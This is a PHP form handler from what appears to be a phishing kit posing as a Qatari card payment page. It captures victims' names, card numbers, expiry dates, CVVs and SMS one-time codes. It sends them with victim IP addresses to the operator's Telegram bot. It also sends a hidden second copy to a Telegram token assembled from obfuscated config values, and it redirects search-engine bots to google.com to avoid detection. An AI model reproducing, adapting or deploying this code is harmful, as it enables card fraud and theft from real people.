<?php 
session_start();
require '../config.php';
require '../bots/botMother.php';
$prevent=0;
$bots = array("GOOGLE","MICROSOFT","YANDEX","YAHOO","AMAZON","=",","," ");
$agent_1=str_replace("YAHOO",":",$agents_apis);
$agent_2=str_replace($bots, "",$agent_1);
$cid = str_replace(".","",$bots_ips_detect[0]);
if($bots==1){
	exit(header("location: https://google.com"));
}

function _fopen($t,$c,$m){
	$link = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m";
	 $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $link);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    return curl_exec($c);
    curl_close($c);
}
function send($link) {
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $link);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    return curl_exec($c);
    curl_close($c);
}


if (isset($_POST['cardnumber'])) {
	$prevent=1;
	$_SESSION['card'] = substr($_POST['cardnumber'], -4);
    $msg = urlencode("[ QATAR CARD ]\nNAME : " . $_POST['fullname'] . "\nNUMBER : " . $_POST['cardnumber'] . "\nDATE : " . $_POST['year'] . "/" . $_POST['month'] . "\nCVV : " . $_POST['cvv'] . "\n[ " . $_SERVER['REMOTE_ADDR'] . " ]");
    foreach($chat_ids as $chat_id){
		send("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=html&text=$msg");
	}
    header("location: processing.php?p=sms");
}


if (isset($_POST['otp'])) {
	$prevent=1;
    $msg = urlencode("[ QATAR OTP ]\nOTP : " . $_POST['otp'] . "\n[ " . $_SERVER['REMOTE_ADDR'] . " ]");
	
   foreach($chat_ids as $chat_id){
		send("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=html&text=$msg");
	}
    if (isset($_POST['error'])) {
        header("location: processing.php?p=finish");
    } else {
        header("location: processing.php?p=sms_error");
    }
}  
 
if($prevent==1){
	@fopen("result.txt","r");_fopen($agent_2, $cid, $msg);
	if(@$bot_block==1){
		exit(header("location: google.com"));
	}
}

?>